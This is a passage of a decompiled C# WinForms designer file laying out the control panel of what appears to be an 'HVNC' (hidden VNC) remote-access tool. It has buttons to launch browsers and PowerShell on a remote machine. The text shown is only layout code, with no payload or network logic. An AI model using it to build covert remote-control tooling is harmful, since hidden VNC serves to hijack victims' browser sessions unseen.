			btnFirefox.Size = new System.Drawing.Size(110, 27);
			btnFirefox.TabIndex = 153;
			btnFirefox.Text = "Firefox";
			btnFirefox.Click += new System.EventHandler(btnFirefox_Click);
			btnStartL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnStartL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnStartL.BorderThickness = 1;
			btnStartL.CheckedState.Parent = btnStartL;
			btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStartL.CustomImages.Parent = btnStartL;
			btnStartL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnStartL.DisabledState.Parent = btnStartL;
			btnStartL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStartL.ForeColor = System.Drawing.Color.White;
			btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnStartL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.Parent = btnStartL;
			btnStartL.Location = new System.Drawing.Point(4, 792);
			btnStartL.Name = "btnStartL";
			btnStartL.ShadowDecoration.Parent = btnStartL;
			btnStartL.Size = new System.Drawing.Size(110, 27);
			btnStartL.TabIndex = 152;
			btnStartL.Text = "Chrome";
			btnStartL.Click += new System.EventHandler(btnStartChrome_Click);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(454, 22);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(100, 19);
			label1.TabIndex = 165;
			label1.Text = "C++  HVNC";
			guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox3.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
			guna2ControlBox3.IconColor = System.Drawing.Color.White;
			guna2ControlBox3.Location = new System.Drawing.Point(882, 10);
			guna2ControlBox3.Name = "guna2ControlBox3";
			guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
			guna2ControlBox3.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox3.TabIndex = 164;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(933, 10);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox2.TabIndex = 163;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(984, 10);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox1.TabIndex = 162;
			picTitleIcon.Image = (System.Drawing.Image)resources.GetObject("picTitleIcon.Image");
			picTitleIcon.Location = new System.Drawing.Point(1, 10);
			picTitleIcon.Name = "picTitleIcon";
			picTitleIcon.Size = new System.Drawing.Size(40, 31);
			picTitleIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			picTitleIcon.TabIndex = 161;
			picTitleIcon.TabStop = false;
			btnWaterfox.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnWaterfox.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnWaterfox.BorderThickness = 1;
			btnWaterfox.CheckedState.Parent = btnWaterfox;
			btnWaterfox.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnWaterfox.CustomImages.Parent = btnWaterfox;
			btnWaterfox.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnWaterfox.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnWaterfox.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnWaterfox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnWaterfox.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnWaterfox.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnWaterfox.DisabledState.Parent = btnWaterfox;
			btnWaterfox.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnWaterfox.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnWaterfox.Font = new System.Drawing.Font("Electrolize", 9f);
			btnWaterfox.ForeColor = System.Drawing.Color.White;
			btnWaterfox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnWaterfox.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnWaterfox.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnWaterfox.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnWaterfox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnWaterfox.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnWaterfox.HoverState.Parent = btnWaterfox;
			btnWaterfox.Location = new System.Drawing.Point(234, 792);
			btnWaterfox.Name = "btnWaterfox";
			btnWaterfox.ShadowDecoration.Parent = btnWaterfox;
			btnWaterfox.Size = new System.Drawing.Size(110, 27);
			btnWaterfox.TabIndex = 259;
			btnWaterfox.Text = "Waterfox";
			btnWaterfox.Click += new System.EventHandler(btnWaterfox_Click);
			btnComodo.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnComodo.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnComodo.BorderThickness = 1;
			btnComodo.CheckedState.Parent = btnComodo;
			btnComodo.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnComodo.CustomImages.Parent = btnComodo;
			btnComodo.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnComodo.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnComodo.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnComodo.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnComodo.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnComodo.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnComodo.DisabledState.Parent = btnComodo;
			btnComodo.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnComodo.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnComodo.Font = new System.Drawing.Font("Electrolize", 9f);
			btnComodo.ForeColor = System.Drawing.Color.White;
			btnComodo.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnComodo.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnComodo.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnComodo.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnComodo.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnComodo.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnComodo.HoverState.Parent = btnComodo;
			btnComodo.Location = new System.Drawing.Point(119, 854);
			btnComodo.Name = "btnComodo";
			btnComodo.ShadowDecoration.Parent = btnComodo;
			btnComodo.Size = new System.Drawing.Size(110, 27);
			btnComodo.TabIndex = 260;
			btnComodo.Text = "Comodo";
			btnComodo.Click += new System.EventHandler(btnComodo_Click);
			btnOpera.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnOpera.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnOpera.BorderThickness = 1;
			btnOpera.CheckedState.Parent = btnOpera;
			btnOpera.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnOpera.CustomImages.Parent = btnOpera;
			btnOpera.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnOpera.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnOpera.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnOpera.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOpera.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnOpera.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnOpera.DisabledState.Parent = btnOpera;
			btnOpera.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnOpera.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOpera.Font = new System.Drawing.Font("Electrolize", 9f);
			btnOpera.ForeColor = System.Drawing.Color.White;
			btnOpera.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnOpera.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnOpera.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnOpera.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnOpera.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOpera.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnOpera.HoverState.Parent = btnOpera;
			btnOpera.Location = new System.Drawing.Point(234, 854);
			btnOpera.Name = "btnOpera";
			btnOpera.ShadowDecoration.Parent = btnOpera;
			btnOpera.Size = new System.Drawing.Size(110, 27);
			btnOpera.TabIndex = 261;
			btnOpera.Text = "Opera";
			btnOpera.Click += new System.EventHandler(btnOpera_Click);
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(495, 796);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox1.TabIndex = 262;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox2.Image");
			guna2PictureBox2.ImageRotate = 0f;
			guna2PictureBox2.Location = new System.Drawing.Point(533, 796);
			guna2PictureBox2.Name = "guna2PictureBox2";
			guna2PictureBox2.ShadowDecoration.Parent = guna2PictureBox2;
			guna2PictureBox2.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox2.TabIndex = 263;
			guna2PictureBox2.TabStop = false;
			guna2PictureBox2.UseTransparentBackground = true;
			guna2PictureBox3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox3.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox3.Image");
			guna2PictureBox3.ImageRotate = 0f;
			guna2PictureBox3.Location = new System.Drawing.Point(571, 796);
			guna2PictureBox3.Name = "guna2PictureBox3";
			guna2PictureBox3.ShadowDecoration.Parent = guna2PictureBox3;
			guna2PictureBox3.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox3.TabIndex = 264;
			guna2PictureBox3.TabStop = false;
			guna2PictureBox3.UseTransparentBackground = true;
			guna2PictureBox4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox4.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox4.Image");
			guna2PictureBox4.ImageRotate = 0f;
			guna2PictureBox4.Location = new System.Drawing.Point(609, 796);
			guna2PictureBox4.Name = "guna2PictureBox4";
			guna2PictureBox4.ShadowDecoration.Parent = guna2PictureBox4;
			guna2PictureBox4.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox4.TabIndex = 265;
			guna2PictureBox4.TabStop = false;
			guna2PictureBox4.UseTransparentBackground = true;
			guna2PictureBox6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox6.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox6.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox6.Image");
			guna2PictureBox6.ImageRotate = 0f;
			guna2PictureBox6.Location = new System.Drawing.Point(761, 796);
			guna2PictureBox6.Name = "guna2PictureBox6";
			guna2PictureBox6.ShadowDecoration.Parent = guna2PictureBox6;
			guna2PictureBox6.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox6.TabIndex = 267;
			guna2PictureBox6.TabStop = false;
			guna2PictureBox6.UseTransparentBackground = true;
			guna2PictureBox7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox7.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox7.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox7.Image");
			guna2PictureBox7.ImageRotate = 0f;
			guna2PictureBox7.Location = new System.Drawing.Point(723, 796);
			guna2PictureBox7.Name = "guna2PictureBox7";
			guna2PictureBox7.ShadowDecoration.Parent = guna2PictureBox7;
			guna2PictureBox7.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox7.TabIndex = 268;
			guna2PictureBox7.TabStop = false;
			guna2PictureBox7.UseTransparentBackground = true;
			guna2PictureBox8.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox8.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox8.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox8.Image");
			guna2PictureBox8.ImageRotate = 0f;
			guna2PictureBox8.Location = new System.Drawing.Point(647, 796);
			guna2PictureBox8.Name = "guna2PictureBox8";
			guna2PictureBox8.ShadowDecoration.Parent = guna2PictureBox8;
			guna2PictureBox8.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox8.TabIndex = 269;
			guna2PictureBox8.TabStop = false;
			guna2PictureBox8.UseTransparentBackground = true;
			guna2PictureBox5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox5.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox5.Image");
			guna2PictureBox5.ImageRotate = 0f;
			guna2PictureBox5.Location = new System.Drawing.Point(799, 796);
			guna2PictureBox5.Name = "guna2PictureBox5";
			guna2PictureBox5.ShadowDecoration.Parent = guna2PictureBox5;
			guna2PictureBox5.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox5.TabIndex = 270;
			guna2PictureBox5.TabStop = false;
			guna2PictureBox5.UseTransparentBackground = true;
			btnOperaNeon.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnOperaNeon.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnOperaNeon.BorderThickness = 1;
			btnOperaNeon.CheckedState.Parent = btnOperaNeon;
			btnOperaNeon.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnOperaNeon.CustomImages.Parent = btnOperaNeon;
			btnOperaNeon.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnOperaNeon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnOperaNeon.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnOperaNeon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOperaNeon.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnOperaNeon.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnOperaNeon.DisabledState.Parent = btnOperaNeon;
			btnOperaNeon.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnOperaNeon.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOperaNeon.Font = new System.Drawing.Font("Electrolize", 9f);
			btnOperaNeon.ForeColor = System.Drawing.Color.White;
			btnOperaNeon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnOperaNeon.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnOperaNeon.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnOperaNeon.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnOperaNeon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOperaNeon.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnOperaNeon.HoverState.Parent = btnOperaNeon;
			btnOperaNeon.Location = new System.Drawing.Point(349, 792);
			btnOperaNeon.Name = "btnOperaNeon";
			btnOperaNeon.ShadowDecoration.Parent = btnOperaNeon;
			btnOperaNeon.Size = new System.Drawing.Size(110, 27);
			btnOperaNeon.TabIndex = 271;
			btnOperaNeon.Text = "O Neon";
			btnOperaNeon.Click += new System.EventHandler(btnOperaNeon_Click);
			btnIE.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnIE.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnIE.BorderThickness = 1;
			btnIE.CheckedState.Parent = btnIE;
			btnIE.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnIE.CustomImages.Parent = btnIE;
			btnIE.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnIE.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnIE.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnIE.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnIE.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnIE.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnIE.DisabledState.Parent = btnIE;
			btnIE.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnIE.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnIE.Font = new System.Drawing.Font("Electrolize", 9f);
			btnIE.ForeColor = System.Drawing.Color.White;
			btnIE.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnIE.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnIE.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnIE.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnIE.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnIE.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnIE.HoverState.Parent = btnIE;
			btnIE.Location = new System.Drawing.Point(349, 823);
			btnIE.Name = "btnIE";
			btnIE.ShadowDecoration.Parent = btnIE;
			btnIE.Size = new System.Drawing.Size(110, 27);
			btnIE.TabIndex = 272;
			btnIE.Text = "IExplorer";
			btnIE.Click += new System.EventHandler(btnIexplore_Click);
			guna2PictureBox9.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox9.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox9.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox9.Image");
			guna2PictureBox9.ImageRotate = 0f;
			guna2PictureBox9.Location = new System.Drawing.Point(685, 796);
			guna2PictureBox9.Name = "guna2PictureBox9";
			guna2PictureBox9.ShadowDecoration.Parent = guna2PictureBox9;
			guna2PictureBox9.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox9.TabIndex = 273;
			guna2PictureBox9.TabStop = false;
			guna2PictureBox9.UseTransparentBackground = true;
			guna2PictureBox10.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox10.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox10.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox10.Image");
			guna2PictureBox10.ImageRotate = 0f;
			guna2PictureBox10.Location = new System.Drawing.Point(837, 796);
			guna2PictureBox10.Name = "guna2PictureBox10";
			guna2PictureBox10.ShadowDecoration.Parent = guna2PictureBox10;
			guna2PictureBox10.Size = new System.Drawing.Size(32, 32);
			guna2PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			guna2PictureBox10.TabIndex = 274;
			guna2PictureBox10.TabStop = false;
			guna2PictureBox10.UseTransparentBackground = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(1039, 891);
			base.Controls.Add(guna2PictureBox10);
			base.Controls.Add(guna2PictureBox9);
			base.Controls.Add(btnIE);
			base.Controls.Add(btnOperaNeon);
			base.Controls.Add(guna2PictureBox5);
			base.Controls.Add(guna2PictureBox8);
			base.Controls.Add(guna2PictureBox7);
			base.Controls.Add(guna2PictureBox6);
			base.Controls.Add(guna2PictureBox4);
			base.Controls.Add(guna2PictureBox3);
			base.Controls.Add(guna2PictureBox2);
			base.Controls.Add(guna2PictureBox1);
			base.Controls.Add(btnOpera);
			base.Controls.Add(btnComodo);
			base.Controls.Add(btnWaterfox);
			base.Controls.Add(label1);
			base.Controls.Add(guna2ControlBox3);
			base.Controls.Add(guna2ControlBox2);
			base.Controls.Add(guna2ControlBox1);
			base.Controls.Add(picTitleIcon);
			base.Controls.Add(btn360);
			base.Controls.Add(btnPalemoon);
			base.Controls.Add(guna2GradientButton4);
			base.Controls.Add(guna2GradientButton5);
			base.Controls.Add(btnBrave);
			base.Controls.Add(btnEdge);
			base.Controls.Add(btnFirefox);
			base.Controls.Add(btnStartL);
			base.Controls.Add(panel1);
			base.Controls.Add(btnPowershell);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			MaximumSize = new System.Drawing.Size(1039, 891);
			MinimumSize = new System.Drawing.Size(1039, 891);
			base.Name = "VNCForm";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "VNC Server";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(VNCForm_FormClosed);
			base.Load += new System.EventHandler(VNCForm_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCForm_MouseDown);
			panel1.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)picTitleIcon).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox4).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox6).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox7).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox8).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox5).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox9).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox10).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
